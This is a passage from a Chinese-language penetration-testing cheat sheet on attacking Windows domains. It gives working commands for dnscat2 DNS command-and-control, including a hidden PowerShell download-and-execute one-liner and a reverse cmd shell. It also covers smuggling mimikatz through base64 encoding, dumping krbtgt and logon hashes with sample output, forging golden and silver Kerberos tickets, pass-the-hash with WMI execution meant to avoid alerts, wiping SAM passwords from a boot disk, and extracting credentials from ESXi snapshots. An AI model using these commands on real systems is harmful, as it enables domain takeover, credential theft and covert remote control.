title="域内相关操作"></a>域内相关操作</h2><h3 id="查询域内机器"><a href="#查询域内机器" class="headerlink" title="查询域内机器"></a>查询域内机器</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:domain_name</span><br></pre></td></tr></table></figure><h3 id="查询域用户组相关"><a href="#查询域用户组相关" class="headerlink" title="查询域用户组相关"></a>查询域用户组相关</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> /domain                       <span class="comment">#查询所有的用户组</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain  <span class="comment">#查询域控制器组</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain       <span class="comment">#获取域管理员列表</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Account Operations&quot;</span> /domain  <span class="comment">#查询Account Operations这个组信息，里面有注释相关的信息</span></span><br></pre></td></tr></table></figure><h3 id="域密码策略"><a href="#域密码策略" class="headerlink" title="域密码策略"></a>域密码策略</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain                    <span class="comment">#里面有多久修改一次密码，还有输错是否锁定</span></span><br></pre></td></tr></table></figure><h3 id="域信任信息"><a href="#域信任信息" class="headerlink" title="域信任信息"></a>域信任信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts                    <span class="comment">#如果是多个域可以看到其他域是否信任</span></span><br></pre></td></tr></table></figure><h3 id="域主机名"><a href="#域主机名" class="headerlink" title="域主机名"></a>域主机名</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup <span class="literal">-type</span>=SRV _ldap._tcp</span><br></pre></td></tr></table></figure><h2 id="环境限制突破"><a href="#环境限制突破" class="headerlink" title="环境限制突破"></a>环境限制突破</h2><h3 id="只能使用DNS协议"><a href="#只能使用DNS协议" class="headerlink" title="只能使用DNS协议"></a>只能使用DNS协议</h3><h4 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h4><p>安装dnscat2服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install ruby-dev git make g++</span><br><span class="line">sudo gem install bundler</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>然后需要一个域名和你dnscat2服务端的IP（1.1.1.1），并做如下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">主机记录            记录类型            线路类型           记录值              </span><br><span class="line">ns1                A                  默认              1.1.1.1</span><br><span class="line">ccc        　　　　 MX                 默认              ns1.ascotbe.com</span><br></pre></td></tr></table></figure><p>接着服务器上启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb ccc.ascotbe.com -e open -c 123456 --no-cache</span><br></pre></td></tr></table></figure><ul><li><code>-c</code>:你的密码</li><li><code>-e</code>:参数可以规定安全级别，open代表让客户端进行选择。</li><li><code>--no-cache</code>，请务必在运行服务器时添加无缓存选项，因为powershell-dnscat2客户端与dnscat2服务器的caching模式不兼容。</li></ul><p>然后客户端（受害机器）进行使用，目前有两种方式</p><ul><li><p>powershell版本的（不推荐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &#123;IEX(New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#x27;); Start-Dnscat2 -Domain ccc.ascotbe.com -PreSharedSecret 123456&#125;</span><br></pre></td></tr></table></figure></li><li><p>官方的编译版本，<a href="https://downloads.skullsecurity.org/dnscat2/">下载地址</a>   <a href="https://github.com/Ascotbe/Image/tree/master/Windows">备份地址</a>  解压密码都是<code>password</code></p><p>首先可以看到，机器ping命令是能解析目标IP，但是无法通外网</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/32.png" alt="image-20211202131410776"></p><p>那么我们，启动来测试是否可以通我们搭好的dnscat2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\dnscat2-v0.07-client-win32.exe --ping dnslog.ascotbe.com</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/33.png" alt="image-20211202113653585"></p><p>可以看到上图是成功了，接着服务端查看</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/34.png" alt="image-20211202113638340"></p><p>然后使用如下命令进行上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\dnscat2-v0.07-client-win32.exe --dns domain=dnslog.ascotbe.com --secret=123456</span><br></pre></td></tr></table></figure><p>接着就能看到上线成功了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/35.png" alt="image-20211202113759197"></p><p>我们输入<code>session -i 1</code>来进入通道，然后运行<code>exec cmd</code>后就能反弹一个cmd窗口的（session 2），接着使用<code>session -i 2</code>进入我们的cmd窗口就能正常执行命令了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/36.png" alt="image-20211202131830321"></p></li></ul><h3 id="无法传入EXE文件"><a href="#无法传入EXE文件" class="headerlink" title="无法传入EXE文件"></a>无法传入EXE文件</h3><p>在某些环境下可能不让你上传exe文件，但是可以传入文本之类的</p><h4 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编码</span></span><br><span class="line">CertUtil <span class="literal">-encode</span> mimikatz.exe mimikatz_base64.txt</span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line">CertUtil <span class="literal">-decode</span> mimikatz_base64.txt mimikatz.exe</span><br></pre></td></tr></table></figure><h4 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编码</span></span><br><span class="line"><span class="variable">$PEBytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="string">&quot;mimikatz.exe&quot;</span>)<span class="variable">$Base64Payload</span> = [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$PEBytes</span>)<span class="built_in">Set-Content</span> mimikatz_base64.txt <span class="literal">-Value</span> <span class="variable">$Base64Payload</span></span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="variable">$Base64Bytes</span> = <span class="built_in">Get-Content</span> (<span class="string">&quot;mimikatz_base64.txt&quot;</span>)<span class="variable">$PEBytes</span>= [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$Base64Bytes</span>)[<span class="type">System.IO.File</span>]::WriteAllBytes(<span class="string">&quot;mimikatz.exe&quot;</span>,<span class="variable">$PEBytes</span>)</span><br></pre></td></tr></table></figure><h2 id="关于票据"><a href="#关于票据" class="headerlink" title="关于票据"></a>关于票据</h2><p>票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法</p><h3 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h3><ul><li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心， Kerberos将KDC的功能分成两个部分：身份验证服务器（AS）和票据授予服务（TGS）</li><li><strong>AS</strong>(Authentication Server)： 身份认证服务，用来验证用户凭证（账户名和密码）的服务器</li><li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li><li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li><li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li><li><strong>SS</strong>（Service Server）&#x3D; 特定服务提供端</li></ul><p>认证示意图</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/37.png" alt="img"></p><p>时序图</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/38.png" alt="img"></p><h3 id="GoldenTicket"><a href="#GoldenTicket" class="headerlink" title="GoldenTicket"></a>GoldenTicket</h3><div class="note success modern"><p>黄金票据：即伪造的<code>TGT</code>票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取<code>任意</code>的票据。</p><p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，所以我们只需要拿到一台登录了域管理员的机器，就能通过Hash伪造任意用户的Ticket</p></div><p>获取krbtgt用户的hash值,获取域sid</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::dcsync /domain:&lt;域名&gt; /user:krbtgt&quot;</span> <span class="keyword">exit</span> &gt; <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p>获取的值如下(值我已经乱填过)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;200&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /domain:test.local  /user:krbtgt</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;test.local&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ASCOTBE.test.local&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : </span><br><span class="line">Password last change : <span class="number">2017</span>/<span class="number">8</span>/<span class="number">17</span> <span class="number">18</span>:<span class="number">09</span>:<span class="number">55</span></span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-723378730-3341234667-4111158365-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">    lm  - <span class="number">0</span>: aad3b435b51111eeaddcb435b51404ee</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : TEST.LOCALkrbtgt</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">8</span>d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">43</span>fc951431a81adc78aabb6ac95e616c</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">14</span>e1b600b1fd579f</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : TEST.LOCALkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">14</span>e1b600b1fd579f</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    Kerberos<span class="literal">-Newer-Keys</span></span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    <span class="number">01</span>  e5b53098321798817beb6b83cb28d34f</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><p>几种利用方式</p><ul><li><p>生成黄金票据，后直接进行ptt连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li><li><p>生成黄金票据，并且保存到文件中后再利用（通过krbtgt的Hash）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ticket:test.kribi</span><br><span class="line"><span class="comment">#清空票据</span></span><br><span class="line">kerberos::purge</span><br><span class="line"><span class="comment">#导入生成的票据</span></span><br><span class="line">kerberos::ppt test.kribi</span><br><span class="line"><span class="comment">#查看当前会话票据</span></span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure></li><li><p>生成黄金票据，并且保存到文件中后再利用（通过krbtgt的aes256，上述lsadump中的aes256_hmac值）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kerberos::gloden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /aes256:&lt;KRBTGT aes256_hmac&gt; /user:&lt;任意用户名&gt; /ticket:test.kribi</span><br><span class="line"><span class="comment">#清空票据</span></span><br><span class="line">kerberos::purge</span><br><span class="line"><span class="comment">#导入生成的票据</span></span><br><span class="line">kerberos::ppt test.kribi</span><br><span class="line"><span class="comment">#查看当前会话票据</span></span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure></li></ul><p>测试是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\ASCOTBE.test.local\c$</span><br></pre></td></tr></table></figure><p>最后通过PSexec来利用即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe  \\ASCOTBE.test.local cmd.exe</span><br></pre></td></tr></table></figure><blockquote><p>注：TGT 有效时间为 20 分钟</p></blockquote><h3 id="SilverTicket"><a href="#SilverTicket" class="headerlink" title="SilverTicket"></a>SilverTicket</h3><div class="note success modern"><p>白银票据：即伪造的<code>TGS</code>票据，也称服务票据ST。</p><p>攻击者通过伪造合法的TGS，可以直接发送给Server，访问指定的某个服务。</p></div><p>获取目标服务器的NTML hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="keyword">exit</span> &gt; <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure><p>获取的值如下（省略了垃圾值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;200&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">996</span> (<span class="number">00000000</span>:<span class="number">000003</span>e4)</span><br><span class="line">Session           : Service from <span class="number">0</span></span><br><span class="line">User Name         : ASCOTBE<span class="variable">$</span></span><br><span class="line">Domain            : TEST</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">2021</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">13</span>:<span class="number">45</span>:<span class="number">00</span></span><br><span class="line">SID               : S<span class="literal">-1-5-20</span></span><br><span class="line">mSv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : ASCOTBE<span class="variable">$</span></span><br><span class="line"> * Domain   : TEST</span><br><span class="line"> * NTLM     : <span class="number">5</span>dfe648fa11117928a8882a6ebdbc7f1</span><br><span class="line"> * SHA1     : <span class="number">614</span>f3586b4e791233c9da5d94f98ea540f831a84</span><br><span class="line">tsPkG :</span><br><span class="line">wDiGeST :</span><br><span class="line"> * Username : ASCOTBE<span class="variable">$</span></span><br><span class="line"> * Domain   : TEST</span><br><span class="line"> * Password : (null)</span><br><span class="line">kErberoS :</span><br><span class="line"> * Username : ascotbe<span class="variable">$</span></span><br><span class="line"> * Domain   : TEST.LOCAL</span><br><span class="line"> * Password : (null)</span><br><span class="line">sSp :</span><br><span class="line">crEdMan :</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">184879637</span> (<span class="number">00000000</span>:<span class="number">0</span>b050a15)</span><br><span class="line">Session           : RemoteInteractive from <span class="number">3</span></span><br><span class="line">User Name         : lalala</span><br><span class="line">Domain            : TEST</span><br><span class="line">Logon Server      : ASCOTBE</span><br><span class="line">Logon Time        : <span class="number">2021</span>/<span class="number">11</span>/<span class="number">18</span> <span class="number">13</span>:<span class="number">46</span>:<span class="number">30</span></span><br><span class="line">SID               : S<span class="literal">-1-5-21-721238730-3340555557-4129158365-1131</span></span><br><span class="line">mSv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : lalala</span><br><span class="line"> * Domain   : TEST</span><br><span class="line"> * NTLM     : <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"> * SHA1     : <span class="number">7</span>c4a8d09ca3762af61e59520943dc26494f8941b</span><br><span class="line"> [<span class="number">00010000</span>] CredentialKeys</span><br><span class="line"> * NTLM     : <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"> * SHA1     : <span class="number">7</span>c4a8d09ca3762af61e59520943dc26494f8941b</span><br><span class="line">tsPkG :</span><br><span class="line">wDiGeST :</span><br><span class="line"> * Username : lalala</span><br><span class="line"> * Domain   : TEST</span><br><span class="line"> * Password : (null)</span><br><span class="line">kErberoS :</span><br><span class="line"> * Username : lalala</span><br><span class="line"> * Domain   : TEST.LOCAL</span><br><span class="line"> * Password : (null)</span><br><span class="line">sSp :</span><br><span class="line">crEdMan :</span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><p>然后通过NTLM hash来登录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域账户SID&gt; /target:&lt;目标服务器主机名&gt; /service:cifs /rc4:&lt;服务账号的 NTLM Hash，Username带<span class="variable">$</span>符号的那个&gt; /user:&lt;用户名&gt; /ptt&quot;</span> <span class="keyword">exit</span></span><br><span class="line"><span class="comment">#例如通过上面获取的值来填写</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;kerberos::golden /domain:test.local /sid:S-1-5-21-721238730-3340555557-4129158365 /target:ASCOTBE.test.local /service:cifs /rc4:5dfe648fa11117928a8882a6ebdbc7f1 /user:lalala /ptt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><blockquote><p>注：在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service，然后 NTLM Hash值是要那个带$号的</p></blockquote><p>可以伪造的服务：</p><table><thead><tr><th align="left">服务类型</th><th align="left">服务名</th></tr></thead><tbody><tr><td align="left">WMI</td><td align="left">HOST、RPCSS</td></tr><tr><td align="left">PowerShell Remoting</td><td align="left">HOST、HTTP</td></tr><tr><td align="left">WinRM</td><td align="left">HOST、HTTP</td></tr><tr><td align="left">Scheduled Tasks</td><td align="left">HOST</td></tr><tr><td align="left">Windows File Share (CIFS)</td><td align="left">CIFS</td></tr><tr><td align="left">LDAP operations including</td><td align="left">LDAP</td></tr><tr><td align="left">Mimikatz DCSync</td><td align="left">LDAP</td></tr><tr><td align="left">Windows Remote Server Administration Tools</td><td align="left">RPCSS、LDAP、CIFS</td></tr></tbody></table><h3 id="两者的区别"><a href="#两者的区别" class="headerlink" title="两者的区别"></a>两者的区别</h3><p><strong>访问权限不同：</strong></p><ul><li>Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</li><li>Silver Ticket：伪造TGS，只能访问指定的服务</li></ul><p><strong>加密方式不同：</strong></p><ul><li>Golden Ticket由Kerberos的Hash加密</li><li>Silver Ticket由服务账号（通常为计算机账户）Hash加密</li></ul><p><strong>认证流程不同：</strong></p><ul><li>Golden Ticket的利用过程需要访问域控，</li><li>而Silver Ticket不需要</li></ul><h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><p>不想登录目标机器，获取指定用户hash，可以申请一个smb和ldap、cifs类型的票据，然后利用minikatz命令来获取hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:ascotbe\krbtgt /kdc:DC1.ascotbe.test.com</span><br></pre></td></tr></table></figure><p>主要是配合<a href="https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2021-42287">这个使用</a>，有了高权限的hash，通过WMI不登录来执行命令，这样就不会产生告警了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:krbtgt /domain:ascotbe.test.com /ntlm:e1c8222a64b22222081b111182307137</span><br></pre></td></tr></table></figure><p>用上面的命令会弹出一个新的CMD窗口，这个窗口是缓存了这个账号的hash的，接着使用这个<a href="https://github.com/Ascotbe/Image/blob/master/Windows/WMIHACKER.vbs">脚本</a>，即可执行命令上线机器了，具体看操作看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript WMIHACKER.vbs /cmd DC1.ascotbe.test.com &quot;-&quot; &quot;-&quot; &quot;systeminfo&quot; 1</span><br></pre></td></tr></table></figure><h2 id="关于虚拟机"><a href="#关于虚拟机" class="headerlink" title="关于虚拟机"></a>关于虚拟机</h2><h3 id="无需密码进入系统"><a href="#无需密码进入系统" class="headerlink" title="无需密码进入系统"></a>无需密码进入系统</h3><div class="note success modern"><p>这方式没法抓内存中密码，顶多进系统看下有什么敏感文件</p></div><p>首先需要制作PE镜像推荐使用<a href="http://m.laomaotao.net/">老毛桃</a>，制作一个ISO类型的镜像，首先编辑我们导入的镜像，把老毛桃导入进去</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/39.png" alt="image-20211222140410918"></p><p>然后进入BIOS</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/40.png" alt="image-20211222140441233"></p><p>接着把CD放到第一个启动顺序</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/41.png" alt="image-20211222140503557"></p><p>修改完保存启动系统</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/42.png" alt="image-20211222140541165"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/43.png" alt="image-20211222140553940"></p><p>接着搜索SAM文件</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/44.png" alt="image-20211222140612098"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/45.png" alt="image-20211222140635120"></p><p>找到后选着你需要清除的账号进行清除</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/46.png" alt="image-20211222140707980"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/47.png" alt="image-20211222140713013"></p><p>选着后重启系统，就能直接进入了，然后可以看看虚拟机有什么值得获取的文件</p><h3 id="提取系统内存"><a href="#提取系统内存" class="headerlink" title="提取系统内存"></a>提取系统内存</h3><div class="note success modern"><p>有时候渗透可能会拿下VMware ESXI等集群管理权限，但是如果需要下载镜像需要关机，这时我们可以使用快照功能，然后把快照下载到本地进行抓密码</p></div><p>快照下载需要进去存储中，然后<strong>vmem</strong>和<strong>vmsn</strong>都得下载下来，如下图</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/48.png" alt="image-20211224131729770"></p><p>然后把快照进行内存转储工具<a href="https://flings.vmware.com/vmss2core">下载</a>，<a href="https://github.com/Ascotbe/Image/tree/master/Windows">备份地址</a></p><p>如果目标机器使用的是Microsoft Windows 8&#x2F;8.1、Windows Server 2012、Windows Server 2016 或 Windows Server 2019 的话使用下面命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmss2core.exe -W8 VM-Snapshot1.vmsn VM-Snapshot1.vmem</span><br></pre></td></tr></table></figure><p>如果是其他的Windows使用如下命令</p><figure class="highlight plaintext"><table><tr><td 